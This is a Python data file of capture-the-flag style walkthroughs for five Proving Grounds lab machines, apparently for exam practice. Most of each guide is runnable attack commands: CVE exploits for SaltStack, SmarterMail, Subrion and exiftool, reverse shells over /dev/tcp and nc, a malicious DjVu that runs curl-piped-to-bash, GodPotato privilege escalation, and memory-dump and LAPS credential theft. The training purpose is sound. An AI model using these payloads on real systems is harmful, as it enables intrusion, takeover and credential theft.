# Twiggy, Algernon, Pelican, Exfiltrated, Hutch. Loaded by build_guides.py.
# Each "If this doesn't match" tip names the route most public write-ups show,
# for when the box doesn't behave the way the notes describe.
# Uses the P, C, O, L, W, F helpers from build_guides.py, which runs this file.

twiggy = {
  'title': 'Linux · SaltStack → direct root',
  'ips': {'K': '192.168.45.180', 'T': '192.168.153.60'},
  'steps': [
    {'h': 'Recon', 'b': [
      P('salt-master runs as root, so RCE here **is** root.'),
      C('sudo nmap -p- --min-rate 5000 -Pn {T} -oN twiggy_ports.txt\nsudo nmap -sC -sV -p 22,53,80,4505,4506,8000 -Pn {T} -oN twiggy_svc.txt'),
      O('4505/tcp open  zmtp   ZeroMQ ZMTP 2.0\n4506/tcp open  zmtp   ZeroMQ ZMTP 2.0\n8000/tcp open  http   SaltStack rest_cherrypy'),
      P('🎯 Ports **4505/4506** are a SaltStack master. Port 8000 leaks version **3000**.')]},
    {'h': 'Vuln: CVE-2020-11651 (auth bypass) + CVE-2020-11652 (traversal)', 'b': [
      C('searchsploit saltstack\nsearchsploit -m 48421     # or your offline jasperla PoC')]},
    {'h': 'Confirm RCE', 'b': [
      C("python3 exploit.py --master {T} --exec 'id'"),
      O('uid=0(root) gid=0(root)'),
      P('✅ Running as root.')]},
    {'h': 'Reverse shell as root', 'b': [
      C('rlwrap nc -lvnp 80'),
      C('python3 exploit.py --master {T} --exec \'bash -c "bash -i >& /dev/tcp/{K}/80 0>&1"\''),
      W('Egress is filtered: call back on port **80**.'),
      C('cat /root/proof.txt'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '📡 ZeroMQ on **4505/4506** means SaltStack.',
    '📦 Keep PoCs **offline**: there\'s no internet in the exam.',
    '✅ Confirm with `id` before you try for a shell.'],
}

algernon = {
  'title': 'Windows · SmarterMail .NET Remoting RCE → direct SYSTEM',
  'ips': {'K': '192.168.45.245', 'T': '192.168.120.110'},
  'steps': [
    {'h': 'Recon', 'b': [
      P('The SmarterMail service runs as SYSTEM, so there is **no privesc step**.'),
      C('sudo nmap -p- --min-rate 3000 {T} -oN algernon_ports.txt'),
      O('21 ftp | 80 http | 135 | 139 | 445 | 5040 | 9998 | 17001')]},
    {'h': 'Identify SmarterMail', 'b': [
      C('sudo nmap -A -p 9998,17001 {T} -oN algernon_svc.txt\ncurl -sL http://{T}:9998 | grep -i -E "stProductVersion|stProductBuild"'),
      O('9998/tcp  open  http      Microsoft IIS 10.0  → /interface/root\n17001/tcp open  remoting  MS .NET Remoting services\nvar stProductBuild = "6919 (Dec 11, 2018)";'),
      P('🎯 **SmarterMail build 6919**, with .NET Remoting exposed on **17001** (CVE-2019-7214).')]},
    {'h': 'Get the exploit', 'b': [
      C('searchsploit smartermail\nsearchsploit -m 49216'),
      O('SmarterMail Build 6985 - Remote Code Execution  | windows/remote/49216.py'),
      P('It is written for build 6985, but 6919 is older and also vulnerable ✅')]},
    {'h': 'Configure it', 'b': [
      C('sed -i "s/^HOST=.*/HOST=\'{T}\'/; s/^PORT=.*/PORT=17001/; s/^LHOST=.*/LHOST=\'{K}\'/; s/^LPORT=.*/LPORT=17001/" 49216.py\ngrep -nE "^(HOST|PORT|LHOST|LPORT)=" 49216.py'),
      O("HOST='{T}'\nPORT=17001\nLHOST='{K}'\nLPORT=17001")]},
    {'h': 'Exploit', 'b': [
      P('Terminal 1:'),
      C('sudo rlwrap nc -lvnp 17001'),
      P('Terminal 2:'),
      C('python3 49216.py'),
      O('whoami\nnt authority\\system'),
      W('Outbound traffic is filtered: your listener must use **port 17001**, a port the target already uses.')]},
    {'h': 'proof.txt', 'b': [
      C('type C:\\Users\\Administrator\\Desktop\\proof.txt', 'cmd'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '🔍 For unusual ports, run `nmap -A` and check the page source for version strings.',
    '📮 Ports **9998 + 17001** together mean SmarterMail.',
    '🔁 An exploit written for a newer build often works on older builds too.',
    '🚧 Outbound filtered? Listen on a port the target already uses (**17001** here).'],
}

pelican = {
  'title': 'Linux · Exhibitor RCE → gcore → root',
  'ips': {'K': '192.168.45.180', 'T': '192.168.153.64'},
  'steps': [
    {'h': 'Recon', 'b': [
      C('sudo nmap -sC -sV -p 22,80,2181,8080,8181 -Pn {T} -oN pelican_svc.txt'),
      O('2181/tcp open  zookeeper 3.4.6\n8080/tcp open  http      Exhibitor Web UI'),
      P('🎯 **Exhibitor** on 8080 lets you edit the `java.env` startup script, which is command injection.')]},
    {'h': 'Foothold: inject into the config', 'b': [
      P('Open `http://{T}:8080/exhibitor/v1/ui/index.html`, go to the **Config** tab, turn **Editing ON**, and put this in the **java.env script** field:'),
      C('$(bash -i >& /dev/tcp/{K}/80 0>&1)'),
      C('rlwrap nc -lvnp 80'),
      O('uid=1000(charles)'),
      W('Egress is filtered: call back on port **80**.'),
      C('cat /home/charles/local.txt'),
      F('local.txt captured')]},
    {'h': 'Privesc enumeration', 'b': [
      C('find / -perm -u=s -type f 2>/dev/null'),
      O('/usr/bin/gcore  <-- SUID, abnormal'),
      W('**If this doesn\'t match:** on most runs gcore isn\'t SUID. Instead `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/gcore` for charles. Then use `sudo gcore <PID>` in the next step.'),
      C('sudo -l')]},
    {'h': 'Root via a memory dump', 'b': [
      C("ps -ef | grep -i -E 'root|screen|backup'    # pick a root PID, e.g. 812\ncd /tmp\ngcore 812\nstrings core.812 | grep -i -E 'pass|pwd|root'"),
      O('... password=<secret> ...'),
      P('Write-ups usually find the secret in a root process called **password-store**. Dump that PID first.'),
      C('su root        # enter the recovered password\ncat /root/proof.txt'),
      W('The exact PID and secret vary: dump each root PID and run `strings` on it.'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '🔍 **2181 + 8080** means ZooKeeper with Exhibitor.',
    '💥 A field that becomes a startup script means RCE.',
    '🧪 An odd SUID or sudo binary (`gcore`) is your privesc: check **GTFOBins**.'],
}

exfiltrated = {
  'title': 'Linux · Subrion 4.2.1 upload bypass → root cron exiftool (CVE-2021-22204) → root',
  'ips': {'K': '192.168.45.245', 'T': '192.168.228.163'},
  'steps': [
    {'h': 'Recon and the vhost', 'b': [
      C('sudo nmap -sC -sV -p 22,80 -Pn {T} -oN exfil_svc.txt'),
      O('22/tcp open  ssh\n80/tcp open  http   Apache httpd 2.4.41 (Ubuntu)\n| http-robots.txt: /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/\n|_http-title: Did not follow redirect to http://exfiltrated.offsec/'),
      P('It redirects to `exfiltrated.offsec`, so add the name to /etc/hosts:'),
      C("echo '{T} exfiltrated.offsec' | sudo tee -a /etc/hosts\ncurl -s http://exfiltrated.offsec/panel/ | grep -o 'Subrion CMS v[0-9.]*'"),
      O('Subrion CMS v4.2.1')]},
    {'h': 'Subrion admin → upload a .phar shell', 'b': [
      P('The panel is at `/panel/`. **admin:admin** works. Version 4.2.1 has **CVE-2018-19422**: `.php` is blocked, but `.phar` still runs as PHP.'),
      C(r'''cp /usr/share/webshells/php/php-reverse-shell.php shell.phar
sed -i "s/^\$ip = .*/\$ip = '{K}';/; s/^\$port = .*/\$port = 4444;/" shell.phar
grep -nE '^\$ip|^\$port' shell.phar'''),
      O("$ip = '{K}';\n$port = 4444;"),
      W('Edit the file **before** you upload it. Then upload it in **Panel → Content → Uploads**.'),
      C('rlwrap nc -lvnp 4444'),
      C('curl http://exfiltrated.offsec/uploads/shell.phar'),
      O('connect to [{K}] from (UNKNOWN) [{T}]\nuid=33(www-data) gid=33(www-data) groups=33(www-data)'),
      C('python3 -c \'import pty; pty.spawn("/bin/bash")\''),
      P('💡 "Connection refused (111)" means the server still has the old file with 127.0.0.1:1234. Re-upload the fixed one.'),
      P('💡 Script route: `searchsploit -m 49876` then `python3 49876.py -u http://exfiltrated.offsec/panel/ --user admin --pass admin`'),
      C('find / -name local.txt 2>/dev/null'),
      F('local.txt captured')]},
    {'h': 'Privesc: find the root cron', 'b': [
      C('cat /etc/crontab\ncat /opt/image-exif.sh'),
      O('* * * * * root bash /opt/image-exif.sh\n\nIMAGES=\'/var/www/html/subrion/uploads\'\nls $IMAGES | grep "jpg" | while read filename;\ndo\nexiftool "$IMAGES/$filename" >> $LOGFILE\ndone'),
      P('Every minute, root runs **exiftool** on each `.jpg` in the uploads folder, and www-data can write there. That is **CVE-2021-22204**: a crafted DjVu file runs commands when exiftool reads it.'),
      P('`pspy64` shows the same thing if `/etc/crontab` is hidden.')]},
    {'h': 'Root: malicious DjVu named .jpg', 'b': [
      P('On Kali, build the payload:'),
      C(r'''sudo apt-get install -y djvulibre-bin
cat > shell.sh << 'EOF'
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{K}",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
EOF
printf '(metadata "\\c${system ('"'"'curl http://{K}/shell.sh | bash'"'"')};")' > exploit
cat exploit
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
mv exploit.djvu exploit.jpg
file exploit.jpg'''),
      O(r'''(metadata "\c${system ('curl http://{K}/shell.sh | bash')};")
exploit.jpg: DjVu image or single page document'''),
      P('Kali tab 1:'),
      C('sudo python3 -m http.server 80'),
      P('Kali tab 2:'),
      C('rlwrap nc -lvnp 4445'),
      P('On the target (www-data):'),
      C('wget http://{K}/exploit.jpg -O /var/www/html/subrion/uploads/exploit.jpg'),
      P('⏳ Wait up to a minute for the cron job.'),
      O('connect to [{K}] from (UNKNOWN) [{T}]\n# id\nuid=0(root) gid=0(root) groups=0(root)'),
      C('cat /root/proof.txt'),
      W('Use port **4445** for root, because your www-data shell is still on 4444.'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '🌐 A redirect to a hostname means adding it to `/etc/hosts`.',
    '🔑 Try default logins like admin:admin, and use `.phar` when `.php` is blocked.',
    '✏️ Edit the reverse shell\'s IP and port **before** uploading.',
    '⏰ Read `/etc/crontab` and any script it calls; **pspy** finds hidden cron jobs.',
    '🖼️ A root cron running exiftool on a folder you can write to gives root through a crafted DjVu (**CVE-2021-22204**).',
    '🚫 The "malicious filename" trick doesn\'t work here, because the script quotes the filename.'],
}

hutch = {
  'title': 'Windows AD · LDAP password → WinRM → SYSTEM',
  'ips': {'K': '192.168.45.180', 'T': '192.168.153.122'},
  'steps': [
    {'h': 'Recon', 'b': [
      P('The domain is **hutch.offsec**.'),
      C('sudo nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,5985,9389 -Pn {T} -oN hutch_svc.txt'),
      P('🎯 It\'s a Domain Controller with **WinRM (5985)** open.')]},
    {'h': 'Anonymous LDAP', 'b': [
      C('ldapsearch -x -H ldap://{T} -b "DC=hutch,DC=offsec" "(objectClass=user)" | tee ldap_users.txt | grep -i -E "description|info|sAMAccountName"'),
      O('sAMAccountName: fmcsorley\ndescription: CrabSharkJellyfish192'),
      P('🔑 The password is in the **description** field.')]},
    {'h': 'Validate the creds and get a shell', 'b': [
      C("nxc winrm {T} -u fmcsorley -p 'CrabSharkJellyfish192' | tee nxc_winrm.txt     # Pwn3d!\nevil-winrm -i {T} -u fmcsorley -p 'CrabSharkJellyfish192'"),
      C('type ..\\Desktop\\local.txt', 'cmd'),
      F('local.txt captured')]},
    {'h': 'Privesc to SYSTEM', 'b': [
      C('whoami /priv', 'cmd'),
      O('SeImpersonatePrivilege Enabled'),
      P('On Kali, host GodPotato and nc.exe:'),
      C('python3 -m http.server 80'),
      P('In evil-winrm:'),
      C('iwr http://{K}/GodPotato-NET4.exe -o C:\\Windows\\Temp\\gp.exe\niwr http://{K}/nc.exe -o C:\\Windows\\Temp\\nc.exe\nC:\\Windows\\Temp\\gp.exe -cmd "C:\\Windows\\Temp\\nc.exe {K} 443 -e cmd.exe"', 'powershell'),
      C('rlwrap nc -lvnp 443'),
      O('nt authority\\system'),
      W('Egress is filtered: serve on **80**, catch on **443**.'),
      C('type C:\\Users\\Administrator\\Desktop\\proof.txt', 'cmd'),
      F('proof.txt captured 👑')]},
  ],
  'backup': {'h': 'If this doesn\'t match: read the LAPS password', 'b': [
    P('Most write-ups of Hutch don\'t show SeImpersonate for fmcsorley. The usual route: **LAPS** is set up and fmcsorley can read the Administrator password.'),
    C("ldapsearch -x -H ldap://{T} -D 'hutch\\fmcsorley' -w 'CrabSharkJellyfish192' -b 'DC=hutch,DC=offsec' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd"),
    O('ms-Mcs-AdmPwd: <the Administrator password>'),
    C("evil-winrm -i {T} -u administrator -p '<password from above>'")]},
  'takeaways': [
    '🏢 On a DC, try an **anonymous LDAP bind** and read `description` and `info`.',
    '✅ Validate creds with `nxc` before anything else.',
    '🎟️ `whoami /priv` showing SeImpersonate means GodPotato or PrintSpoofer.',
    '🔐 A domain user with LAPS read rights means the local admin password.',
    '📦 Keep those binaries **offline**.'],
}

BATCH2 = {'pgp-twiggy': twiggy, 'pgp-algernon': algernon, 'pgp-pelican': pelican, 'pgp-exfiltrated': exfiltrated, 'pgp-hutch': hutch}
